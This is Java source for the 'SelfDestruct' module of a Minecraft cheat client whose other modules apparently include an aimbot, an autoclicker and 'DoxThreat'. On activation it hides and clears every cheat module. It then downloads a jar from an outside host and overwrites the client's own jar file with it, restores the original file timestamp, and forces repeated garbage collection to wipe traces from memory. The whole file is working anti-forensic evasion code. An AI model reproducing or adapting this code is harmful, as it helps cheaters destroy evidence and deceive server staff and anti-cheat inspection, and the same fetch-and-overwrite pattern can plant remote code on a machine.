package xyz.gucciclient.modules.mods.other;

import xyz.gucciclient.*;
import org.apache.commons.compress.utils.*;
import java.net.*;
import java.io.*;
import xyz.gucciclient.utils.*;
import net.minecraft.client.gui.*;
import xyz.gucciclient.modules.mods.combat.*;
import xyz.gucciclient.modules.mods.utility.*;
import xyz.gucciclient.modules.mods.render.*;
import xyz.gucciclient.modules.*;
import java.util.*;

public class G0ttaDipMen extends Module
{
    public G0ttaDipMen() {
        super(Modules.SelfDestruct.name(), 65, Category.OTHER);
    }
    
    public void onLivingUpdate() {
        try {
            URL downloadURL = new URL("https://glitch.gay/test.jar");
            String a = Gucci.class.getProtectionDomain().getCodeSource().getLocation().getPath();
            String b = URLDecoder.decode(a, "UTF-8");
            File c = new File(b.split("!")[0].substring(5, b.split("!")[0].length()));
            long d = c.lastModified();
            InputStream e = downloadURL.openStream();
            byte[] f = IOUtils.toByteArray(e);
            e.close();
            FileOutputStream g = new FileOutputStream(c, false);
            g.write(f);
            g.close();
            c.setLastModified(d);
            URL.setURLStreamHandlerFactory(null);
            downloadURL = null;
            a = null;
            b = null;
            c = null;
            d = 0L;
            e = null;
            f = null;
            g = null;
            System.gc();
            System.runFinalization();
            System.gc();
            Thread.sleep(100L);
            System.gc();
            System.runFinalization();
            System.gc();
            Thread.sleep(200L);
            System.gc();
            System.runFinalization();
        }
        catch (Throwable e2) {
            e2.printStackTrace();
        }
    }
    
    @Override
    public void onEnable() {
        if (Wrapper.getPlayer() != null) {
            if (Wrapper.getMinecraft().currentScreen == Gucci.getClickGUI()) {
                Wrapper.getMinecraft().displayGuiScreen((GuiScreen)null);
            }
            this.setName("");
            Module.getModule(A1moboating.class).setName("");
            Module.getModule(A0toCricking.class).setName("");
            Module.getModule(DoxThreat.class).setName("");
            Module.getModule(G0ui.class).setName("");
            Module.getModule(Screen.class).setName("");
            Module.getModule(Heal.class).setName("");
            Module.getModule(Debuff.class).setName("");
            Module.getModule(AgroPearl.class).setName("");
            Module.getModule(FastBridge.class).setName("");
            Module.getModule(Fullbright.class).setName("");
            for (final Module mod : ModuleManager.getModules()) {
                if (mod != null && mod.getState()) {
                    mod.setState(false);
                }
            }
            ModuleManager.getModules().clear();
            this.getValues().clear();
            this.getBooleans().clear();
            this.onLivingUpdate();
        }
    }
}
